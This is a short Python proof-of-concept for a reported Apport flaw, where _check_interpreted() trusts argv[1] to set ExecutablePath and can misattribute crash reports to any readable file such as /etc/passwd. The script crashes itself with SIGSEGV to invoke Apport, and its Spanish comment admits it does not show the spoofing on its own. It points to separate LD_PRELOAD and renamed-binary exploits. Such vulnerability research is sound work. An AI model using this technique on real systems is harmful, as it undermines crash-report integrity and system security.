#!/usr/bin/env python3
"""
PoC: Apport ExecutablePath Override via _check_interpreted()

Vulnerability: apport/report.py:_check_interpreted() (lines 626-633) uses
the crashing process's ProcCmdline argv[1] to override ExecutablePath.
The only validation is os.access(path, R_OK) — no check that the path
is the actual script, a legitimate binary, or packaged.

This allows a crash report to be misattributed to an arbitrary readable
file on the system.

CWE-345: Insufficient Verification of Data Authenticity
"""

import sys
import os
import signal


def cause_crash():
    os.kill(os.getpid(), signal.SIGSEGV)


if __name__ == "__main__":
    target = sys.argv[1] if len(sys.argv) > 1 else "/etc/passwd"

    print(f"[*] PID: {os.getpid()}")
    print(f"[*] argv: {sys.argv}")
    print(f"[*] /proc/self/exe: {os.readlink('/proc/self/exe')}")
    print(f"[*] /proc/self/cmdline: {open('/proc/self/cmdline', 'rb').read()}")
    print()
    print("[*] NOTA IMPORTANTE: este PoC mínimo NO demuestra el spoofing por")
    print("[*] sí solo. Ejecutado como `python3 poc_apport_override.py <target>`,")
    print("[*] apport atribuirá el crash a ESTE script (cmdargs[1] = el propio")
    print("[*] script), que es el comportamiento correcto de _check_interpreted().")
    print("[*] Para el spoofing real usar exploit_apport.py (LD_PRELOAD sobre un")
    print("[*] intérprete, dejando el target en argv[1]) o pwn_apport.c")
    print("[*] (binario renombrado como `python_*` con argv[1] = target).")
    print()
    print("[*] Triggering SIGSEGV to invoke apport core_pattern handler...")
    print("[*] Check /var/log/apport.log and /var/crash/ after the crash")
    print()

    cause_crash()
